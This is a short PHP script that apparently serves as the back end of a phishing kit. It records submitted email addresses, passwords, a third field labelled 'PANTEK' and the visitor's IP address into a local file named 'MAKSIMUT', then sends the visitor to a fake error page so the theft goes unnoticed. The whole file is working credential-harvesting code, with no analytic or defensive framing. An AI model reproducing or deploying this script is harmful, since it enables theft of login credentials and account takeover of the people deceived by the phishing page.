<?php
$file = "MAKSIMUT";
$email = $_POST['email'];
$password = $_POST['password'];
$parse = $_POST['parse'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "__________________________________");
fwrite($handle, "\n");
fwrite($handle, "LOGIN ID    : ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "SANDI ID    : ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "PANTEK      : ");
fwrite($handle, "$parse");
fwrite($handle, "\n");
fwrite($handle, "Ip Address  : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "__________________________________");
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"connect/error.html\";
// -->
</script>";
?>